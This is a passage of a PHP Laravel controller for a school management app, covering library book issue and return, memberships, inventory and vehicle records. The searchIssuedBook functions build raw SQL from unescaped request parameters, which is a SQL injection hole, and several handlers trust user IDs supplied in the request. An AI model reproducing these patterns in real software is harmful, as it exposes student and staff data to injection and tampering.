
        try {
            $memberDetails = AramiscLibraryMember::where('student_staff_id', '=', $student_staff_id)->where('school_id',$school_id)->first();

            if ($member_type == 2) {
                $getMemberDetails = AramiscStudent::select('full_name', 'email', 'mobile', 'student_photo')->where('user_id', '=', $student_staff_id)->where('school_id',$school_id)->first();
            } else {
                $getMemberDetails = AramiscStaff::select('full_name', 'email', 'mobile', 'staff_photo')->where('user_id', '=', $student_staff_id)->where('school_id',$school_id)->first();
            }

            $books = AramiscBook::where('school_id',$school_id)->get();
            $totalIssuedBooks = AramiscBookIssue::where('member_id', '=', $student_staff_id)->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['memberDetails'] = $memberDetails->toArray();
                $data['books'] = $books->toArray();
                $data['totalIssuedBooks'] = $totalIssuedBooks->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.library.issueBooks', compact('memberDetails', 'books', 'getMemberDetails', 'totalIssuedBooks'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saveIssueBookData(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'book_id' => "required",
                'due_date' => "required",
                'user_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'book_id' => "required",
                'due_date' => "required"
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $user = Auth()->user();

            if ($user) {
                $user_id = $user->id;
            } else {
                $user_id = $request->login_id;
            }
            $bookIssue = new AramiscBookIssue();
            $bookIssue->book_id = $request->book_id;
            $bookIssue->member_id = $request->member_id;
            $bookIssue->given_date = date('Y-m-d');
            $bookIssue->due_date = date('Y-m-d', strtotime($request->due_date));
            $bookIssue->issue_status = 'I';
            $bookIssue->created_by = $user_id;
            $results = $bookIssue->save();
            $bookIssue->toArray();

            if ($results) {
                $books = AramiscBook::find($request->book_id);
                $books->quantity = $books->quantity - 1;
                $result = $books->update();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Book Issued  successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }

                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_saveIssueBookData(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'book_id' => "required",
                'due_date' => "required",
                'user_id' => "required",
                'school_id' => "required",
            ]);
        } else {
            $validator = Validator::make($input, [
                'book_id' => "required",
                'due_date' => "required",
                'school_id' => "required",
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $user = Auth()->user();

            if ($user) {
                $user_id = $user->id;
            } else {
                $user_id = $request->login_id;
            }
            $bookIssue = new AramiscBookIssue();
            $bookIssue->book_id = $request->book_id;
            $bookIssue->member_id = $request->member_id;
            $bookIssue->given_date = date('Y-m-d');
            $bookIssue->due_date = date('Y-m-d', strtotime($request->due_date));
            $bookIssue->issue_status = 'I';
            $bookIssue->created_by = $user_id;
            $bookIssue->school_id = $request->school_id;
            $results = $bookIssue->save();
            $bookIssue->toArray();

            if ($results) {
                $books = AramiscBook::where('school_id',$request->school_id)->find($request->book_id);
                $books->quantity = $books->quantity - 1;
                $result = $books->update();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Book Issued  successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }

                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function returnBookView(Request $request, $issue_book_id)
    {

        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($issue_book_id, null);
            }
            return view('backEnd.library.returnBookView', compact('issue_book_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_returnBookView(Request $request,$school_id, $issue_book_id)
    {

        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($issue_book_id, null);
            }
            return view('backEnd.library.returnBookView', compact('issue_book_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function returnBook(Request $request, $issue_book_id)
    {


        try {
            $user = Auth()->user();
            if ($user) {
                $updated_by = $user->id;
            } else {
                $updated_by = $request->updated_by;
            }
            $return = AramiscBookIssue::find($issue_book_id);
            $return->issue_status = "R";
            $return->updated_by = $updated_by;
            $results = $return->update();

            if ($results) {

                $books_id = AramiscBookIssue::select('book_id')->where('id', $issue_book_id)->first();
                $books = AramiscBook::find($books_id->book_id);
                $books->quantity = $books->quantity + 1;
                $result = $books->update();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Book has been Returned  successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_returnBook(Request $request,$school_id, $issue_book_id)
    {
        try {
            $user = Auth()->user();
            if ($user) {
                $updated_by = $user->id;
            } else {
                $updated_by = $request->updated_by;
            }
            $return = AramiscBookIssue::where('school_id',$school_id)->find($issue_book_id);
            $return->issue_status = "R";
            $return->updated_by = $updated_by;
            $results = $return->update();

            if ($results) {

                $books_id = AramiscBookIssue::select('book_id')->where('id', $issue_book_id)->where('school_id',$school_id)->first();
                $books = AramiscBook::where('school_id',$school_id)->find($books_id->book_id);
                $books->quantity = $books->quantity + 1;
                $result = $books->update();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Book has been Returned  successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function allIssuedBook(Request $request)
    {

        try {
            $books = AramiscBook::select('id', 'book_title')->where('active_status', 1)->get();
            $subjects = AramiscSubject::select('id', 'subject_name')->where('active_status', 1)->get();

            $issueBooks = DB::table('aramisc_book_issues')
                ->join('aramisc_books', 'aramisc_book_issues.book_id', '=', 'aramisc_books.id')
                ->join('aramisc_library_members', 'aramisc_book_issues.member_id', '=', 'aramisc_library_members.id')
                ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_books.subject_id')
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['books'] = $books->toArray();
                $data['subjects'] = $subjects->toArray();
                $data['issueBooks'] = $issueBooks;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.library.allIssuedBook', compact('books', 'subjects', 'issueBooks'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_allIssuedBook(Request $request, $school_id)
    {

        try {
            $books = AramiscBook::select('id', 'book_title')->where('active_status', 1)->where('school_id',$school_id)->get();
            $subjects = AramiscSubject::select('id', 'subject_name')->where('active_status', 1)->where('school_id',$school_id)->get();

            $issueBooks = DB::table('aramisc_book_issues')
                ->join('aramisc_books', 'aramisc_book_issues.book_id', '=', 'aramisc_books.id')
                ->join('aramisc_library_members', 'aramisc_book_issues.member_id', '=', 'aramisc_library_members.id')
                ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_books.subject_id')
                ->where('aramisc_book_issues.school_id',$school_id)
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['books'] = $books->toArray();
                $data['subjects'] = $subjects->toArray();
                $data['issueBooks'] = $issueBooks;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.library.allIssuedBook', compact('books', 'subjects', 'issueBooks'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function searchIssuedBook(Request $request)
    {



        try {
            $book_id = $request->book_id;
            $book_number = $request->book_number;
            $subject_id = $request->subject_id;

            $query = '';
            if (!empty($request->book_id)) {
                $query = "AND i.book_id = '$request->book_id'";
            }

            if (!empty($request->book_number)) {
                $query .= "AND b.book_number = '$request->book_number'";
            }

            if (!empty($request->subject_id)) {
                $query .= "AND b.subject_id = '$request->subject_id'";
            }

            $issueBooks = DB::select(DB::raw("SELECT i.*, b.book_title, b.book_number,
                    b.isbn_no, b.author_name, m.member_type, m.student_staff_id, s.subject_name
                    FROM aramisc_book_issues i
                    LEFT JOIN aramisc_books b ON i.book_id = b.id
                    LEFT JOIN aramisc_library_members m ON i.member_id = m.student_staff_id
                    LEFT JOIN aramisc_subjects s ON b.subject_id = s.id
                    WHERE i.issue_status = 'I' $query"));

            $books = AramiscBook::select('id', 'book_title')->where('active_status', 1)->get();
            $subjects = AramiscSubject::select('id', 'subject_name')->where('active_status', 1)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['book_id'] = $book_id;
                $data['book_number'] = $book_number;
                $data['subject_id'] = $subject_id;
                $data['books'] = $books->toArray();
                $data['$subjects'] = $subjects->toArray();
                $data['issueBooks'] = $issueBooks;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.library.allIssuedBook', compact('issueBooks', 'books', 'subjects', 'book_id', 'book_number', 'subject_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_searchIssuedBook(Request $request, $school_id)
    {



        try {
            $book_id = $request->book_id;
            $book_number = $request->book_number;
            $subject_id = $request->subject_id;

            $query = '';
            if (!empty($request->book_id)) {
                $query = "AND i.book_id = '$request->book_id'";
            }

            if (!empty($request->book_number)) {
                $query .= "AND b.book_number = '$request->book_number'";
            }

            if (!empty($request->subject_id)) {
                $query .= "AND b.subject_id = '$request->subject_id'";
            }

            $issueBooks = DB::select(DB::raw("SELECT i.*, b.book_title, b.book_number,
                    b.isbn_no, b.author_name, m.member_type, m.student_staff_id, s.subject_name
                    FROM aramisc_book_issues i
                    LEFT JOIN aramisc_books b ON i.book_id = b.id
                    LEFT JOIN aramisc_library_members m ON i.member_id = m.student_staff_id
                    LEFT JOIN aramisc_subjects s ON b.subject_id = s.id
                    WHERE i.issue_status = 'I' $query"));

            $books = AramiscBook::select('id', 'book_title')->where('active_status', 1)->where('school_id',$school_id)->get();
            $subjects = AramiscSubject::select('id', 'subject_name')->where('active_status', 1)->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['book_id'] = $book_id;
                $data['book_number'] = $book_number;
                $data['subject_id'] = $subject_id;
                $data['books'] = $books->toArray();
                $data['$subjects'] = $subjects->toArray();
                $data['issueBooks'] = $issueBooks;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.library.allIssuedBook', compact('issueBooks', 'books', 'subjects', 'book_id', 'book_number', 'subject_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function all_IssuedBook(Request $request)
    {

        try {
            $books = AramiscBook::select('id', 'book_title')->where('active_status', 1)->get();
            $subjects = AramiscSubject::select('id', 'subject_name')->where('active_status', 1)->get();

            $issueBooks = DB::table('aramisc_book_issues')
                ->join('aramisc_books', 'aramisc_book_issues.book_id', '=', 'aramisc_books.id')
                ->join('aramisc_library_members', 'aramisc_book_issues.member_id', '=', 'aramisc_library_members.id')
                ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_books.subject_id')
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['books'] = $books->toArray();
                $data['subjects'] = $subjects->toArray();
                $data['issueBooks'] = $issueBooks;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.library.allIssuedBook', compact('books', 'subjects', 'issueBooks'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_all_IssuedBook(Request $request, $school_id)
    {

        try {
            $books = AramiscBook::select('id', 'book_title')->where('active_status', 1)->where('school_id',$school_id)->get();
            $subjects = AramiscSubject::select('id', 'subject_name')->where('active_status', 1)->where('school_id',$school_id)->get();

            $issueBooks = DB::table('aramisc_book_issues')
                ->join('aramisc_books', 'aramisc_book_issues.book_id', '=', 'aramisc_books.id')
                ->join('aramisc_library_members', 'aramisc_book_issues.member_id', '=', 'aramisc_library_members.id')
                ->join('aramisc_subjects', 'aramisc_subjects.id', '=', 'aramisc_books.subject_id')
                ->where('aramisc_book_issues.school_id',$school_id)
                ->get();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['books'] = $books->toArray();
                $data['subjects'] = $subjects->toArray();
                $data['issueBooks'] = $issueBooks;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.library.allIssuedBook', compact('books', 'subjects', 'issueBooks'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function cancelMembership(Request $request, $id)
    {
        try {
            $tables = "";

            try {

                $isExist_member_id = AramiscBookIssue::select('id', 'issue_status')
                    ->where('member_id', '=', $id)
                    ->where('issue_status', '=', 'I')
                    ->first();



                if (!empty($isExist_member_id)) {
                    Toastr::error('This member have to return book', 'Failed');
                    return redirect()->back();
                } else {
                    $members = AramiscLibraryMember::find($id);
                    $members->active_status = 0;
                    $results = $members->update();

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        if ($results) {
                            return ApiBaseMethod::sendResponse(null, 'Membership has been successfully cancelled');
                        } else {
                            return ApiBaseMethod::sendError('Something went wrong, please try again.');
                        }
                    } else {
                        if ($results) {
                            Toastr::success('Operation successful', 'Success');
                            return redirect()->back();
                        } else {
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_cancelMembership(Request $request,$school_id, $id)
    {
        try {
            $tables = "";

            try {

                $isExist_member_id = AramiscBookIssue::select('id', 'issue_status')
                    ->where('member_id', '=', $id)
                    ->where('issue_status', '=', 'I')
                    ->where('school_id',$school_id)
                    ->first();



                if (!empty($isExist_member_id)) {
                    Toastr::error('This member have to return book', 'Failed');
                    return redirect()->back();
                } else {
                    $members = AramiscLibraryMember::where('school_id',$school_id)->find($id);
                    $members->active_status = 0;
                    $results = $members->update();

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        if ($results) {
                            return ApiBaseMethod::sendResponse(null, 'Membership has been successfully cancelled');
                        } else {
                            return ApiBaseMethod::sendError('Something went wrong, please try again.');
                        }
                    } else {
                        if ($results) {
                            Toastr::success('Operation successful', 'Success');
                            return redirect()->back();
                        } else {
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    }
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteItemCategoryView(Request $request, $id)
    {
        try {
            $title = "Are you sure to detete this Item category?";
            $url = url('delete-item-category/' . $id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.modal.delete', compact('id', 'title', 'url'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteItemCategoryView(Request $request,$school_id, $id)
    {
        try {
            $title = "Are you sure to detete this Item category?";
            $url = url('delete-item-category/' . $id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.modal.delete', compact('id', 'title', 'url'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteItemCategory(Request $request, $id)
    {
        try {
            $tables = \App\tableList::getTableList('item_category_id',$id);
            try {
                $result = AramiscItemCategory::destroy($id);
                if ($result) {

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        if ($result) {
                            return ApiBaseMethod::sendResponse(null, 'Item Category has been deleted successfully');
                        } else {
                            return ApiBaseMethod::sendError('Something went wrong, please try again.');
                        }
                    } else {
                        if ($result) {
                            Toastr::success('Operation successful', 'Success');
                            return redirect()->back();
                        } else {
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    }
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            } catch (\Illuminate\Database\QueryException $e) {

                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_deleteItemCategory(Request $request,$school_id, $id)
    {
        try {
            $tables = \App\tableList::getTableList('item_category_id',$id);
            try {
                $result = AramiscItemCategory::where('school_id',$school_id)->where('id',$id)->delete();
                if ($result) {

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        if ($result) {
                            return ApiBaseMethod::sendResponse(null, 'Item Category has been deleted successfully');
                        } else {
                            return ApiBaseMethod::sendError('Something went wrong, please try again.');
                        }
                    } else {
                        if ($result) {
                            Toastr::success('Operation successful', 'Success');
                            return redirect()->back();
                        } else {
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    }
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            } catch (\Illuminate\Database\QueryException $e) {

                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteItemView(Request $request, $id)
    {

        try {
            $title = "Are you sure to detete this Item?";
            $url = url('delete-item/' . $id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.modal.delete', compact('id', 'title', 'url'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteItem(Request $request, $id)
    {
        try {
            $tables = \App\tableList::getTableList('item_id',$id);
            try {
                $result = AramiscItem::destroy($id);
                if ($result) {

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        if ($result) {
                            return ApiBaseMethod::sendResponse(null, 'Item has been deleted successfully');
                        } else {
                            return ApiBaseMethod::sendError('Something went wrong, please try again.');
                        }
                    } else {
                        if ($result) {
                            Toastr::success('Operation successful', 'Success');
                            return redirect()->back();
                        } else {
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    }
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            } catch (\Illuminate\Database\QueryException $e) {

                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteStoreView(Request $request, $id)
    {
        try {
            $title = "Are you sure to detete this Item store?";
            $url = url('delete-store/' . $id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.modal.delete', compact('id', 'title', 'url'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteStore(Request $request, $id)
    {
        try {
            $tables = \App\tableList::getTableList('store_id',$id);
            try {
                $result = AramiscItemStore::destroy($id);
                if ($result) {

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        if ($result) {
                            return ApiBaseMethod::sendResponse(null, 'Store has been deleted successfully');
                        } else {
                            return ApiBaseMethod::sendError('Something went wrong, please try again.');
                        }
                    } else {
                        if ($result) {
                            Toastr::success('Operation successful', 'Success');
                            return redirect()->back();
                        } else {
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    }
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            } catch (\Illuminate\Database\QueryException $e) {

                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteSupplierView(Request $request, $id)
    {

        try {
            $title = "Are you sure to detete this Supplier?";
            $url = url('delete-supplier/' . $id);
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.modal.delete', compact('id', 'title', 'url'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function deleteSupplier(Request $request, $id)
    {
        try {
            $tables = \App\tableList::getTableList('supplier_id',$id);
            try {
                $result = AramiscSupplier::destroy($id);
                if ($result) {

                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        if ($result) {
                            return ApiBaseMethod::sendResponse(null, 'Supplier Category has been deleted successfully');
                        } else {
                            return ApiBaseMethod::sendError('Something went wrong, please try again');
                        }
                    } else {
                        if ($result) {
                            Toastr::success('Operation successful', 'Success');
                            return redirect()->back();
                        } else {
                            Toastr::error('Operation Failed', 'Failed');
                            return redirect()->back();
                        }
                    }
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            } catch (\Illuminate\Database\QueryException $e) {
                $msg = 'This data already used in  : ' . $tables . ' Please remove those data first';
                Toastr::error('This item already used', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function itemIssueList(Request $request)
    {

        try {
            $roles = AramiscRole::all();
            $classes = AramiscClass::all();
            $itemCat = AramiscItemCategory::all();
            $issuedItems = AramiscItemIssue::where('active_status', '=', 1)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['roles'] = $roles->toArray();
                $data['classes'] = $classes->toArray();
                $data['itemCat'] = $itemCat->toArray();
                $data['issuedItems'] = $issuedItems->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.inventory.issueItemList', compact('issuedItems', 'roles', 'classes', 'itemCat'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saveItemIssueData(Request $request)
    {
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'role_id' => "required",
                'due_date' => "required",
                'item_id' => "required",
                'quantity' => "required",
                'user_id' => "required",
                'staff_id' => "required",

            ]);
        } else {
            $validator = Validator::make($input, [
                'role_id' => "required",
                'due_date' => "required",
                'item_id' => "required",
                'quantity' => "required"
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $issue_to = '';
            if ($request->role_id == 2) {
                if (!empty($request->student)) {
                    $issue_to = $request->student;
                } else {
                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        return ApiBaseMethod::sendError('Please Select a Student for Issue Item.');
                    }
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            } else {
                if (!empty($request->staff_id)) {
                    $issue_to = $request->staff_id;
                } else {
                    if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                        return ApiBaseMethod::sendError('Please Select a Staff Name for Issue Item.');
                    }
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }

            $user = Auth()->user();

            if ($user) {
                $user_id = $user->id;
            } else {
                $user_id = $request->user_id;
            }

            $itemIssue = new AramiscItemIssue();
            $itemIssue->role_id = $request->role_id;
            $itemIssue->issue_to = $issue_to;
            $itemIssue->issue_by = $user_id;
            $itemIssue->item_category_id = $request->item_category_id;
            $itemIssue->item_id = $request->item_id;
            $itemIssue->issue_date = date('Y-m-d', strtotime($request->issue_date));
            $itemIssue->due_date = date('Y-m-d', strtotime($request->due_date));
            $itemIssue->quantity = $request->quantity;
            $itemIssue->issue_status = 'I';
            $itemIssue->note = $request->description;
            $results = $itemIssue->save();
            $itemIssue->toArray();

            if ($results) {

                $items = AramiscItem::find($request->item_id);
                $items->total_in_stock = $items->total_in_stock - $request->quantity;
                $result = $items->update();
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'New Item has been issued successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function returnItemView(Request $request, $id)
    {

        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($id, null);
            }
            return view('backEnd.inventory.returnItemView', compact('id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function returnItem(Request $request, $id)
    {

        try {
            $iuusedItem = AramiscItemIssue::select('item_id', 'quantity')->where('id', $id)->first();
            $items = AramiscItem::find($iuusedItem->item_id);
            $items->total_in_stock = $items->total_in_stock + $iuusedItem->quantity;
            $result = $items->update();

            if ($result) {
                $itemissue = AramiscItemIssue::find($id);
                $itemissue->issue_status = 'R';
                $itemissue->update();

                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Item has been returned successfully');
                }
                Toastr::success('Operation successful', 'Success');
                return redirect()->back();
            } else {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Assign_Vehicle_delete(Request $request)
    {

        try {
            $result = AramiscAssignVehicle::where('id', $request->id)->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Assign vehicle has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('assign-vehicle');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Assign_Vehicle_delete(Request $request, $school_id)
    {

        try {
            $result = AramiscAssignVehicle::where('id', $request->id)->where('school_id',$school_id)->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Assign vehicle has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('assign-vehicle');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function studentTransportReportApi(Request $request)
    {

        try {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $transport = DB::table('aramisc_assign_vehicles')
                    ->select('aramisc_routes.title as route', 'aramisc_vehicles.vehicle_no', 'aramisc_vehicles.vehicle_model', 'aramisc_vehicles.made_year', 'aramisc_staffs.full_name as driver_name', 'aramisc_staffs.mobile', 'aramisc_staffs.driving_license')
                    ->join('aramisc_routes', 'aramisc_assign_vehicles.route_id', '=', 'aramisc_routes.id')
